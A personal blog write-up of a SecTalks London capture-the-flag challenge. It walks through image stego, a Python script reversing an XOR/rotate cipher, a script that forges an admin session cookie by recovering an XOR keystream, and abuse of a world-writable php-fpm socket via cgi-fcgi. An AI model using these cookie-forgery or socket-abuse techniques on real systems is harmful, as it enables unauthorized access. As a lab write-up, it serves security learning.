![Logo](/assets/images/sectalks5-0.jpg)

Last week I've been to the 5th SecTalks London meetup and I'm proud to say I've learnt something that evening and wanted to say Thank you to the creator of the night's challenge - @leigh.  I'll definitely be going again.

Below is a write-up of my solution. Hopefully by now the details of the challenge are made public so if people are still working on this I won't spoil anyone's fun by publishing this.

## Stage 0

> While taking a well earned break at the Pole Star Tavern, you overhear a couple of the local elves talking about some of the security improvements they've made to Santa's distribution infrastructure this year.
Of particular interest to you is the digitisation of the naughty and nice lists, you know you haven't exactly been on your best behaviour this year, perhaps there is something you can do about that.
You snap out of your daydream to find them picking up the papers they've been glossing over and making for the door. One of them drops something. When nobody is looking you head over and pick it up.
It's a Christmas card with some writing on the front.
The writing looks like it's in some sort of code: 4cf2af119d84f698585ebf494c6ca6321d72eb211d44a49344f4f7393ca73194
There must be some more clues on the card!

![Christmas card](/assets/images/sectalks5-1.png)

## Stage 1
The hint for this stage for "Simple stego". I've first opened the image in Gimp and noticed there was an alpha channel.  Unfortunately nothing really obvious here. Then I thought about varying colour intensity, a method used to enhance black and white images.

In Gimp it is quite easy to [vary the threshold](https://docs.gimp.org/en/gimp-tool-threshold.html): **Colours -> Threshold**. And TA DA !

![Stego revealed](/assets/images/sectalks5-2.png)

## Stage 2
We have some pseudo-code right here. Basically every character of the password was rotated left by its position and then XOR-ed with 42. So to get the initial password we need to apply the reverse operations: XOR then ROR (rotate right!):
 
```python
import binascii                                                                                                                                                                                                                          
 
# Rotate right: 0b1001 --> 0b1100
ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
(val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))
 
p = "4cf2af119d84f698585ebf494c6ca6321d72eb211d44a49344f4f7393ca73194"
v = binascii.unhexlify(p)
 
print [ ord(v[i]) for i in range(len(v))]
 
 
print "".join([ chr(ror(ord(v[i])^42,i,8)) for i in range(len(v))])
```

Running this script we get the credentials for the next stage, accessible at 178.62.xx.xx: **flag{user:elf2207,pass:snow\*\*\*}**

## Stage 3
Nothing interesting after logging in, just 2 list of names randomly changing:

![Lists](/assets/images/sectalks5-3.png)

But there is a cookie, whose value is:

*ccYKPh4W%2BAEcJGLVIbhReh3q3cRXEARRll0DKGEkdNf%2BsWA%3D*

After URL-decoding it, we get a nice Base64 string:
*ccYKPh4W+AEcJGLVIbhReh3q3cRXEARRll0DKGEkdNf+sWA=*

Nothing obvious straight-away. But it becomes interesting if we corrupt the base64 data by removing 2 characters from the end for example. There is an error message displayed:

Corrupted session data: **_{"user":"elf2207","is_admin":fals_**

Probably we removed the last letter 'e' from the encrypted version of the cookie, that's why the error. By comparing the lengths of the decoded base64 and error message, we see they are the same. So the guess is that the session data is encrypted with a sort of one-time-pad. By now you already know what's coming next :sunglasses:

I've XOR-ed the decoded data with the plain-text message to get the key, then used the key to encrypt a new session data, containing the the value true for the **is_admin** property.

```python
import base64                                                                                                                                                                                                                            
 
pt = '{"user":"elf2207","is_admin":false}'
print "[*] Decoded len: ", len(pt)
 
c = base64.b64decode("ccYKPh4W+AEcJGLVIbhReh3q3cRXEARRll0DKGEkdNf+sWA=")
print "[*] Decoded cookie len: ", len(c)
 
# Probably XORed with long one-time-pad. Get the key :D
k = [ord(a) ^ ord(b) for a,b in zip(pt, c)]
print "[*] XOR key: ", k
kStr = "".join([chr(n) for n in k])
 
# Encode desired cookie
pt2 = '{"user":"elf2207","is_admin":true}'
c2 = [ord(a) ^ ord(b) for a,b in zip(pt2, kStr[:len(pt2)])]
print "Admin cookie (to be url-encoded): ", base64.b64encode("".join([chr(n) for n in c2]))
 
# Test
c3 = base64.b64decode("ccYKPh4W+AEcJGLVIbhReh3q3cRXEARRll0DKGE2Z87oqQ==")
pt3 = [ord(a) ^ ord(b) for a,b in zip(kStr, c3)]
print "[*] Decoded test cookie: ", "".join([chr(n) for n in pt3])
```

## Stage 4
Now we're in!

>After poking around for a while you realise that the system is fundamentally broken, and even admins cannot edit the naughty and nice lists!
Determined to exploit the system you press on, and discover that the elf has SSH access to the system, with the credentials "elf2207" and the password "snow***"'

Before exploiting  anything we need to understand some concepts. The machine is a Debian 8 system:

```bash
elf2207@grot0:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 8 (jessie)"
NAME="Debian GNU/Linux"
VERSION_ID="8"
VERSION="8 (jessie)"
ID=debian
HOME_URL="http://www.debian.org/"
SUPPORT_URL="http://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
elf2207@grot0:~$ uname -a
Linux grot0 3.16.0-4-amd64 #1 SMP Debian 3.16.39-1 (2016-12-30) x86_64 GNU/Linux
elf2207@grot0:~$ 
```

[Nginx](https://en.wikipedia.org/wiki/Nginx) web server is running, and by looking in the configuration files we see that it will pass [FastCGI](https://en.wikipedia.org/wiki/FastCGI) requests through a pipe, which will be executed by php-fm.

```bashlocation ~ ^/index.php$ {
        fastcgi_param  SCRIPT_FILENAME    /home/webuser/index.php;
        fastcgi_param  REQUEST_METHOD     $request_method;
        fastcgi_param  REQUEST_URI        $request_uri;
 
        fastcgi_pass unix:/var/run/php-fpm.sock;
}
```

 Going back to the login message, I remembered there was something about /home/webuser directory:
 
 ```bash
$ cat /etc/motd
 
This system is poorly configured. You figure that the data you want must be in the /home/webuser directory.
```

Unfortunately we don't have read permissions to that  folder:
```
drwxr-x---  3 webuser webuser 4096 Jan 26 20:30 webuser
```

But someone else has - php-fm. To understand a bit more what's happening, Nginx is sending requests to the socket file defined in sites-available configuration file and php-fpm is picking them up and executing them:

**_Browser -> nginx -> (FastCGI) -> PHP-FPM _**

The configuration file for php-fm is readable at /usr/local/etc/php-fpm.d/www.conf. Remember the Message of the Day mentioned a _poorly configured_ system. The culprit is actually in the **insecure permissions for the socket used by nginx** to send commands to php-fm:

```
listen = /var/run/php-fpm.sock
listen.mode = 0666
```

This makes the socket world writeable! In fact it  should be readable/writeable only by the nginx user. So we can actually send commands to php-fm ourselves, that is if we first find out how to communicate with it.

```
REQUEST_METHOD=GET SCRIPT_FILENAME= /home/elf2207/hello.php cgi-fcgi -bind -connect /var/run/php-fpm.sock
 
X-Powered-By: PHP/7.2.0-dev
Content-type: text/html; charset=UTF-8
 
Well that was easy wasn't it :)
 
Have a cookie!
```

There are a few minor obstacles here, like not being able to compile stuff on the box (missing GCC) or install apps (no sudo, obviously:) but I'll let you figure out how to overcome them. It shouldn't be too difficult.

## References

**PHP-FM Architecture**

[PHP-FM](https://serversforhackers.com/video/php-fpm-configuration-the-listen-directive)

**Talking to FastCGI Server**

[Directly connecting to PHP-FPM](https://www.thatsgeeky.com/2012/02/directly-connecting-to-php-fpm/)

[Communicate with PHP FastCGI from ruby](http://stackoverflow.com/questions/16561826/communication-with-php-fastcgi-socket-from-ruby)
